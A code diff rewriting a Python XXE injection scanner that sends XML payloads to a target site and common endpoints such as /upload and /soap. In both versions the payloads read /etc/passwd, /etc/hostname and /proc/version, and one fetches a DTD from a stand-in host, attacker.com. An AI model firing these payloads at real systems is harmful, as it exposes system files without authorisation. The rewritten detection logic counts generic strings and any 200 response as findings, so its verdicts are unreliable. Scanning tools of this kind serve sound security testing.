@@ -1,232 +1,187 @@
-import logging
-import re
-import textwrap
-from urllib.parse import urljoin
-from typing import Dict, List, Optional
 from core.base_scanner import BaseScanner
 from core.utils import RequestUtils
+from typing import Dict, List, Optional
+import logging
+import re
+import urllib.parse
 
 class XXEInjectionScanner(BaseScanner):
     def __init__(self, target_url: str, config: Dict):
         super().__init__(target_url, config)
+        
+        # Comprehensive XXE payloads
         self.payloads = [
-            """<?xml version="1.0" encoding="ISO-8859-1"?>
-               <!DOCTYPE foo [ <!ELEMENT foo ANY >
-               <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-               <foo>&xxe;</foo>""",
+            # Basic file read payloads
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/hostname">%xxe;]><test>test</test>',
+            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///proc/version">%xxe;]><test>test</test>',
             
-            """<?xml version="1.0" encoding="ISO-8859-1"?>
-               <!DOCTYPE data [
-               <!ENTITY file SYSTEM "file:///etc/hostname">
-               ]>
-               <data>&file;</data>""",
+            # Error-based XXE
+            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///nonexistent">]><root>&test;</root>',
             
-            """<?xml version="1.0" encoding="ISO-8859-1"?>
-               <!DOCTYPE data [
-               <!ENTITY % file SYSTEM "file:///etc/passwd">
-               <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
-               %eval;
-               %error;
-               ]>
-               <data>test</data>""",
-            
-            """<?xml version="1.0" encoding="UTF-8"?>
-               <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe; ]>
-               <test>test</test>"""
+            # Out-of-band XXE (might not work in local testing)
+            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><test>test</test>'
+        ]
+        
+        # Endpoints to test for XXE
+        self.endpoints = [
+            '/xxe',
+            '/upload',
+            '/import',
+            '/api/data',
+            '/xml',
+            '/soap',
+            '/parse',
+            '/process',
+            '/convert'
         ]
 
     def scan(self) -> Dict:
-        try:
-            tasks = []
-            response = self.make_request(self.target_url)
+        """
+        Perform XXE injection vulnerability scanning
+        
+        Returns:
+            Dict of detected vulnerabilities
+        """
+        vulnerabilities = []
+        
+        # Test base URL
+        base_result = self.test_xxe_injection(self.target_url)
+        if base_result:
+            vulnerabilities.append(base_result)
+        
+        # Test additional endpoints
+        for endpoint in self.endpoints:
+            full_url = self.target_url.rstrip('/') + endpoint
+            result = self.test_xxe_injection(full_url)
+            if result:
+                vulnerabilities.append(result)
+        
+        return {
+            'xxe_injection': vulnerabilities
+        } if vulnerabilities else {}
+
+    def test_xxe_injection(self, url: str) -> Optional[Dict]:
+        """
+        Test a specific URL for XXE injection vulnerabilities
+        
+        Args:
+            url (str): URL to test
+        
+        Returns:
+            Optional vulnerability details
+        """
+        for payload in self.payloads:
+            try:
+                # Test GET parameter
+                get_url = f"{url}?xml={urllib.parse.quote(payload)}"
+                get_response = self.make_request(get_url)
+                
+                if self.verify_xxe_injection(get_response, payload):
+                    return self._create_vulnerability_report(url, get_url, payload)
+                
+                # Test POST parameter
+                headers = {
+                    'Content-Type': 'application/xml',
+                    'Accept': 'application/xml,text/xml,*/*'
+                }
+                
+                post_response = self.make_request(
+                    url,
+                    method='POST',
+                    data={'xml': payload},
+                    headers=headers
+                )
+                
+                if self.verify_xxe_injection(post_response, payload):
+                    return self._create_vulnerability_report(url, url, payload)
             
-            if not response:
-                return {'xxe_injection': []}
+            except Exception as e:
+                logging.error(f"Error testing XXE on {url}: {e}")
+        
+        return None
 
-            # Find XML endpoints and forms
-            forms = RequestUtils.extract_forms(response.text)
-            for form in forms:
-                if self.is_xml_endpoint(form):
-                    form_url = urljoin(self.target_url, form['action'] or self.target_url)
-                    tasks.append({
-                        'type': 'form',
-                        'url': form_url,
-                        'method': form['method'],
-                        'content_type': 'application/xml'
-                    })
+    def verify_xxe_injection(self, response, payload: str) -> bool:
+        """
+        Verify if the response indicates a successful XXE injection
+        
+        Args:
+            response: HTTP response object
+            payload (str): Injected payload
+        
+        Returns:
+            bool: True if XXE injection is detected
+        """
+        if not response:
+            return False
+        
+        # Convert response to lowercase for case-insensitive matching
+        response_text = str(response.text).lower()
+        
+        # Comprehensive list of XXE indicators
+        indicators = [
+            'root:x:',      # /etc/passwd content
+            'uid=',         # User ID
+            'hostname=',    # Hostname disclosure
+            'linux version', # System version
+            'etc/passwd',   # File path
+            'proc/version', # System version file
+            'network/interfaces', # Network configuration
+            'xml parsing error',  # XML parser error
+            'undefined entity',   # XML entity error
+            'fatal error',        # Generic error
+            'simplexml_load',     # PHP XML parser error
+            'javax.xml.parsers',  # Java XML parser error
+        ]
+        
+        # Time-based detection for out-of-band XXE (placeholder)
+        time_based_payload = 'http://attacker.com' in payload
+        
+        # Check for specific XXE indicators
+        return (
+            any(indicator in response_text for indicator in indicators) or
+            (time_based_payload and response.status_code == 200)
+        )
 
-            # Test common XML endpoints
-            common_endpoints = ['/upload', '/import', '/api/data', '/xml', '/soap']
-            for endpoint in common_endpoints:
-                endpoint_url = urljoin(self.target_url, endpoint)
-                tasks.append({
-                    'type': 'endpoint',
-                    'url': endpoint_url,
-                    'method': 'POST',
-                    'content_type': 'application/xml'
-                })
-
-            results = self.run_concurrent_tasks(tasks)
-            return {'xxe_injection': results}
-
-        except Exception as e:
-            logging.error(f"XXE Injection scanner error: {e}")
-            return {'xxe_injection': [], 'error': str(e)}
+    def _create_vulnerability_report(self, base_url: str, full_url: str, payload: str) -> Dict:
+        """
+        Create a standardized vulnerability report
+        
+        Args:
+            base_url (str): Base URL tested
+            full_url (str): Full URL with payload
+            payload (str): XXE payload used
+        
+        Returns:
+            Dict containing vulnerability details
+        """
+        return {
+            'type': 'XXE Injection',
+            'url': base_url,
+            'full_url': full_url,
+            'payload': payload,
+            'severity': 'High',
+            'description': 'Potential XXE injection vulnerability detected',
+            'recommendation': "\n".join([
+                "1. Disable XML external entity processing",
+                "2. Use secure XML parsers with XXE disabled",
+                "3. Implement input validation for XML",
+                "4. Use XML Schema validation",
+                "5. Avoid using user-supplied XML input directly"
+            ])
+        }
 
     def execute_task(self, task: Dict) -> Optional[Dict]:
-        """Implement the required execute_task method"""
-        try:
-            for payload in self.payloads:
-                result = self.test_xxe_injection(
-                    task['url'],
-                    task['method'],
-                    payload,
-                    task['content_type']
-                )
-                if result:
-                    return {
-                        'url': task['url'],
-                        'method': task['method'],
-                        'payload': payload,
-                        'type': 'XXE Injection',
-                        'severity': 'High',
-                        'evidence': result
-                    }
-            return None
-
-        except Exception as e:
-            logging.error(f"Error in XXE injection task: {e}")
-            return None
-
-    def test_xxe_injection(self, url: str, method: str, payload: str, content_type: str) -> Optional[str]:
-        try:
-            headers = {'Content-Type': content_type}
-            response = self.make_request(
-                url,
-                method=method.upper(),
-                data=payload,
-                headers=headers
-            )
-
-            if not response:
-                return None
-
-            # Check for file content disclosure
-            sensitive_patterns = [
-                r'root:.*:0:0:',          # /etc/passwd content
-                r'HOST=.*',                # hostname content
-                r'<?xml.*version=',        # XML parsing error
-                r'<!DOCTYPE.*>',           # DOCTYPE reflection
-                r'SimpleXMLElement',       # PHP XML parser
-                r'javax.xml',              # Java XML parser
-                r'org.xml.sax',            # SAX parser
-                r'XML parsing error',      # Generic XML error
-                r'Warning: simplexml_load'  # PHP warning
-            ]
-
-            for pattern in sensitive_patterns:
-                if re.search(pattern, response.text):
-                    return f"XXE pattern detected: {pattern}"
-
-            # Check for error messages
-            error_patterns = [
-                'java.io.FileNotFoundException',
-                'System.Xml',
-                'XML document structures must start and end within the same entity',
-                'XML parsing error',
-                'error on line'
-            ]
-
-            for error in error_patterns:
-                if error.lower() in response.text.lower():
-                    return f"XXE error detected: {error}"
-
-            return None
-
-        except Exception as e:
-            logging.error(f"Error testing XXE injection: {e}")
-            return None
-
-    def is_xml_endpoint(self, form: Dict) -> bool:
-        """Check if the form or endpoint likely accepts XML input"""
-        form_str = str(form).lower()
-        xml_indicators = [
-            'xml',
-            'import',
-            'upload',
-            'soap',
-            'data',
-            'feed',
-            'rss',
-            'atom'
-        ]
-        return any(indicator in form_str for indicator in xml_indicators)
-
-    def extract_url_parameters(self, url: str) -> List[str]:
-        try:
-            from urllib.parse import urlparse, parse_qs
-            parsed_url = urlparse(url)
-            params = parse_qs(parsed_url.query)
-            return list(params.keys())
-        except Exception as e:
-            logging.error(f"Error extracting URL parameters: {e}")
-            return []
-
-    def test_xxe(self, url: str, method: str, param: str, payload: str, direct: bool = False) -> bool:
-
-        headers = {"Content-Type": "application/xml"}
-        benign_payload = textwrap.dedent("""\
-            <?xml version="1.0"?>
-            <foo>test</foo>""")
-
-        try:
-            if direct:
-                normal_response = self.make_request(
-                    url,
-                    method="POST",
-                    data=benign_payload,
-                    headers=headers
-                )
-                response = self.make_request(
-                    url,
-                    method="POST",
-                    data=payload,
-                    headers=headers
-                )
-            else:
-                normal_data = {param: benign_payload}
-                normal_response = self.make_request(
-                    url,
-                    method=method.upper(),
-                    data=normal_data if method.lower() == 'post' else None,
-                    params=normal_data if method.lower() == 'get' else None,
-                    headers=headers if method.lower() == 'post' else None
-                )
-                data = {param: payload}
-                response = self.make_request(
-                    url,
-                    method=method.upper(),
-                    data=data if method.lower() == 'post' else None,
-                    params=data if method.lower() == 'get' else None,
-                    headers=headers if method.lower() == 'post' else None
-                )
-            
-            if not response or not normal_response:
-                return False
-
-            file_signs = ["root:", "daemon:", "bin:"]
-            for sign in file_signs:
-                if sign in response.text and sign not in normal_response.text:
-                    logging.info(f"Potential XXE vulnerability detected at {url} using payload: {payload}")
-                    return True
-
-            error_patterns = ["Entity", "DOCTYPE", "XML", "fatal error"]
-            for pattern in error_patterns:
-                if re.search(pattern, response.text, re.IGNORECASE) and not re.search(pattern, normal_response.text, re.IGNORECASE):
-                    logging.info(f"Potential XXE vulnerability detected at {url} using payload: {payload} (error pattern match)")
-                    return True
-
-            return False
-        except Exception as e:
-            logging.error(f"Error testing XXE on {url} for parameter '{param}': {e}")
-            return False
+        """
+        Execute a specific XXE injection task
+        
+        Args:
+            task (Dict): Task configuration
+        
+        Returns:
+            Optional vulnerability details
+        """
+        if task.get('type') == 'xxe_injection':
+            return self.test_xxe_injection(task.get('url', ''))
+        
+        return None
